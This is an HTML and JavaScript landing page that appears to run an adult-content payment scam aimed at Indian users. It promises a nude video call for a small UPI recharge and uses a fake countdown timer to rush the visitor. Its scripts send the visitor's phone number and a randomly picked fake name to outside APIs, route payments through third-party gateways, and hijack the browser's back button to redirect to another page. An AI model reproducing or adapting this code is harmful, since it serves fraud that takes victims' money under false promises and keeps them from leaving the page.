<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Special Offer</title>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #e5ddd5;
            background-image: linear-gradient(#e5ddd5, #d5dbd8);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }
        .container {
            width: 100%; max-width: 420px;
            background-color: #fff;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            transform: translateY(0);
            transition: transform 0.3s ease;
        }
        .container:hover { transform: translateY(-5px); }
        .header-image-container { width: 100%; height: auto; overflow: hidden; display: flex; justify-content: center; align-items: center; }
        .header-image { width: 100%; height: auto; display: block; transition: transform 0.5s ease; }
        .header-image:hover { transform: scale(1.05); }
        .header { background-color: #075e54; color: white; padding: 20px; text-align: center; font-size: 22px; font-weight: bold; }
        .price-container { position: relative; display: inline-block; margin: 15px auto; }
        .price-tag {
            background-color: #25d366; color: white; padding: 10px 20px;
            border-radius: 30px; font-size: 28px; font-weight: bold;
            box-shadow: 0 3px 6px rgba(0,0,0,0.16);
            animation: glow 1.5s infinite alternate;
        }
        @keyframes glow { from { box-shadow: 0 0 5px #25d366, 0 0 10px #25d366; } to { box-shadow: 0 0 15px #25d366, 0 0 20px #25d366; } }
        .offer-text {
            background-color: #dcf8c6; color: #075e54;
            padding: 15px; text-align: center; font-size: 17px; font-weight: bold;
            margin: 0 15px; border-radius: 8px; border-left: 4px solid #25d366;
            animation: fadeIn 1s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px);} to { opacity: 1; transform: translateY(0);} }
        .content { padding: 20px; }
        .timer {
            background-color: #ff4444; color: white;
            padding: 12px; text-align: center; font-weight: bold; font-size: 18px;
            margin-bottom: 15px; border-radius: 5px; animation: pulse 1s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1);} 50% { transform: scale(1.02);} 100% { transform: scale(1);} }
        .payment-options { display: flex; flex-direction: column; gap: 15px; }
        .payment-option {
            display: flex; align-items: center; padding: 15px;
            background-color: #f5f5f5; border-radius: 8px; cursor: pointer;
            transition: all 0.3s; box-shadow: 0 1px 3px rgba(0,0,0,0.12);
            border-left: 4px solid #25d366;
        }
        .payment-option:hover { background-color: #e0e0e0; transform: translateY(-3px); box-shadow: 0 4px 8px rgba(0,0,0,0.15); }
        .payment-icon { width: 45px; height: 45px; margin-right: 15px; border-radius: 50%; background-color: white; padding: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
        .payment-text { flex: 1; font-size: 16px; color: #333; font-weight: 500; }
        .footer { text-align: center; padding: 15px; color: #777; font-size: 13px; background-color: #f0f0f0; border-top: 1px solid #ddd; }
        .loader {
            position: fixed; width: 100%; height: 100vh; background: #000000;
            display: none; left: 0; top: 0; z-index: 999999; text-align: center;
        }
        .loader img { width: 120px; margin-top: 80px; }
        .loader p { font-size: 24px; color: #fff; font-weight: bold; margin-top: 30px; }
    </style>
    <script>
        
   async function generateorderid(){
           const urlParams = new URLSearchParams(window.location.search);
         const phone = urlParams.get('phone');
            const amount = urlParams.get('amount');
            const a=document.getElementById("price-span");
               if(a){
                a.innerHTML =amount;
            }
             const names = [
                "Amit",
                "Rahul",
                "Shubham",
                "Neha",
                "Pooja",
                "Rohit",
                "Anjali",
                "Vikas",
                "Suman"
            ];
            const name = names[Math.floor(Math.random() * names.length)];
            localStorage.removeItem("orderId");
            const orderId = await createOrderId(name, phone, amount);
            localStorage.setItem("orderId",orderId);
            localStorage.removeItem("gatewayId");
            const gatewayId = await getPaymentGatewayId();
            localStorage.setItem("gatewayId",gatewayId);
        }
    </script>
</head>
<body onload=generateorderid()>
<div class="loader">
    <img src="200w.gif" alt="loading">
    <p>Wait, we are sending your message. Complete payment to continue...</p>
</div>

<div class="container">
    <div class="header-image-container">
        <img src="xxhub/wp-content/uploads/2025/03/imgonline-com-ua-twotoone-SdAia1ojgn.jpg" alt="Special Offer" class="header-image">
    </div>
    <div class="header">Special Offer Only For Today</div>
    <div style="text-align: center;">
        <div class="price-container">
            <div class="price-tag" id="pricei">₹ <span id="price-span"></span> Only</div>
        </div>
    </div>
    <div class="timer">⏳ Offer ends in: 02:00</div>
    <div class="offer-text">Sirf 99rs ka recharge kar ke ajao video call pe sab dikhaungi kapde khol ke</div>
    <div class="content">
        <div class="payment-options">
            <div class="payment-option" onclick="payNow()">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTo4x8kSTmPUq4PFzl4HNT0gObFuEhivHOFYg&s" alt="PhonePe" class="payment-icon">
                <div class="payment-text">Pay with PhonePe</div>
            </div>
            <div class="payment-option" onclick="payNow()">
                <img src="xxhub/wikipedia/commons/5/5c/Paytm_Logo.png" alt="Paytm" class="payment-icon">
                <div class="payment-text">Pay with PayTm</div>
            </div>
            <div class="payment-option" onclick="payNow()">
                <img src="xxhub/wp-content/uploads/2021/10/Google-Pay-logo-symbol-1.png" alt="Google Pay" class="payment-icon">
                <div class="payment-text">Pay with Google Pay</div>
            </div>
            <div class="payment-option" onclick="payNow()">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzHmvjyM1dK1CC-D8Pn5mXw73Qgmx7QlKnKA&s" alt="BHIM UPI" class="payment-icon">
                <div class="payment-text">Pay with BHIM UPI</div>
            </div>
        </div>
    </div>
    <div class="footer">Limited time offer. Terms and conditions apply.</div>
</div>

<script>
function payNow() {
    // 1. Get phone number from URL (example: ?phone=9876543210)
    const urlParams = new URLSearchParams(window.location.search);
     const phone = urlParams.get('phone');
    const amount = urlParams.get('amount');
    // const amount=1;
     const names = [
        "Amit",
        "Rahul",
        "Shubham",
        "Neha",
        "Pooja",
        "Rohit",
        "Anjali",
        "Vikas",
        "Suman"
    ];

    // 2. List of random names
   
    // 3. Pick a random name
    const randomName = names[Math.floor(Math.random() * names.length)];

    // 4. Console the values
    console.log("Phone from URL:", phone);
    console.log("Random Name:", randomName);
    console.log("amount:", amount);
    
    payment(randomName, phone, amount);
}
</script>




<script>
    async function payment(name, phone, amount){
        
        document.getElementsByClassName("loader")[0].style.display ="block";
        
        let orderId =localStorage.getItem("orderId");  
    if (orderId) {
        console.log("Proceed to payment with orderId:", orderId);
         const gatewayId = localStorage.getItem("gatewayId"); 
    if (Number(gatewayId) == 240001){
        paywithindiplex(orderId,amount,name,phone)
    }
    }else{
        await generateorderid();
        payNow();
    }
}
async function getPaymentGatewayId() {
    try {
        const domainName = window.location.hostname;

        const response = await fetch(
            `https://api.jmdherbs.in/api/v1/common/gateway-details-by-domain-name?domainName=${encodeURIComponent(domainName)}`
        );

        const result = await response.json();

        if (!result) {
            throw new Error("Invalid gateway response");
        }

        // usually gateway id is here (adjust if API response differs)
        return result.id;

    } catch (error) {
        console.error("Gateway Fetch Error:", error);
        alert("Unable to fetch payment gateway");
        return null;
    }
}
async function createOrderId(name, phone, amount) {
    try {
        const response = await fetch(
            "https://api.jmdherbs.in/api/v1/common/Enquiry",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: name,
                    phone: phone,
                    amount: amount,
                    pageName: window.location.pathname,
                    domainName: window.location.hostname
                })
            }
        );

        const result = await response.json();
        console.log("FULL API RESPONSE:", result);

        // 🔥 Correct extraction
        const orderId = result?.data?.id || result?.id;

        if (!orderId) {
            throw new Error("Order ID not found in response");
        }

        console.log("Correct Order ID:", orderId);
        return orderId;
        console.log("Sending Payload:", {
    name: name,
    phone: phone,
    amount: amount,
    pageName: window.location.pathname,
    domainName: window.location.hostname
});


    } catch (error) {
        console.error("Create Order Error:", error.message);
        return null;
    }
    
}
console.log("Page Name Sent:", window.location.pathname);

</script>


<!-- Hidden form -->

<!-- Correct jQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<!-- Cookie plugin -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"
        integrity="sha512-3j3VU6WC5rPQB4Ld1jnLV7Kd5xr+cq9avvhwqzbH/taCRNURoeEpoPBK9pDyeukwSxwRPJ8fDgvYXd6SkaZ2TA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
    // Timer
    let timeLeft = 2 * 60;
    function updateTimer() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        document.querySelector('.timer').textContent =
            `⏳ Offer ends in: ${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        if (timeLeft <= 0) {
            document.querySelector('.timer').textContent = "⏳ Offer expired!";
            document.querySelector('.timer').style.backgroundColor = "#ff0000";
            document.querySelector('.timer').style.animation = "none";
        } else {
            timeLeft--;
            setTimeout(updateTimer,1000);
        }
    }
    updateTimer();

    // Generate mobile
    function generateIndianMobileNumber() {
        let firstDigit = Math.floor(Math.random() * 4) + 6;
        let restDigits = Math.floor(100000000 + Math.random() * 900000000);
        return firstDigit.toString() + restDigits.toString();
    }

    var phone = $.cookie('phone');
    if (!phone) {
        phone = generateIndianMobileNumber();
        $.cookie('phone', phone, { path: '/', expires: 1 });
    }
    $('#cashfree_phone').val(phone);

    // AJAX with better logging
    function callajax(maxcount, gateway_type) {
        $('.loader').show();
        if (maxcount <= 5) {
            $.ajax({
                url: 'https://theluckypay.com/merchant/api/payin.php',
                type: 'POST',
                data: $('#cashfree_form').serialize() + "&gateway_type=" + gateway_type,
                dataType: 'json',
                success: function (response) {
                    console.log("API Response (try " + maxcount + "):", response);

                    if (response.status === 'success' && response.upiIntend) {
                        $('.loader').hide();
                        window.location.href = response.upiIntend;
                    } else {
                        // If API sent message, show it in alert once
                        if (response.message && maxcount === 5) {
                            $('.loader').hide();
                            alert("Payment failed: " + response.message);
                        } else {
                            callajax(maxcount + 1, gateway_type);
                        }
                    }
                },
                error: function (xhr, status, error) {
                    $('.loader').hide();
                    console.error("AJAX Error (try " + maxcount + "):", status, error, xhr.responseText);
                    alert("Error contacting server. Please try again.");
                }
            });
        } else {
            $('.loader').hide();
            alert("Payment service not available right now. Try again later.");
        }
    }

    // Prevent back
   // Prevent back
if (window.history && window.history.pushState) {
    window.history.pushState('', null);
    $(window).on('popstate', function () {
        // agar current page thankyou.html hai to allow back (no redirect)
        if (window.location.pathname.indexOf("whatsapp14d4.php?web=sex2") !== -1) {
            // kuch mat karo
        } else {
            // baaki sab pages par back press karte hi whatsapp page par bhejo
            document.location.href = "whatsapp14d4.php?web=sex2";
        }
    });
}

</script>
<script>
    
function paywithindiplex(orderId, amount, customerName, customerMobile) {
fetch(`https://starconnects.online/checkout.php?orderId=${orderId}&amount=${amount}&name=${customerName}&phone=${customerMobile}`)
.then(res => res.json())
.then(data => {
    if(data.status){
        window.location.href = data.upiLink;
    } else {
        alert(data.message);
    }
});
//     fetch("upiIntent.php", {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/json"
//         },
//         body: JSON.stringify({
//             orderId: orderId.toString(),
//             amount: amount,
//             customerName: customerName,
//             customerMobile: customerMobile
//         })
//     })
//     .then(response => response.json())
//     .then(res => {
// console.log(res);
       
   
//         let sellerInfo = res.data.sellerInfo;
//     if(sellerInfo){
        
//         let upiLink = "upi://pay?" +
//             "pa=" + encodeURIComponent(sellerInfo.vpa) +
//             "&pn=" + encodeURIComponent(sellerInfo.payeeName) +
//             "&mc=" + sellerInfo.mcc +
//             "&tr=" + res.data.orderId +
//             "&am=" + res.data.amount +
//             "&cu=INR";
//             console.log(upiLink);

//         // OPEN UPI APP
//         window.location.href = upiLink;

//         // Redirect to status page
//     }   

//     })
//     .catch(err => {
//         console.error(err);
//         alert("Server error");
//     });
}

    

</script>
</body>
</html>
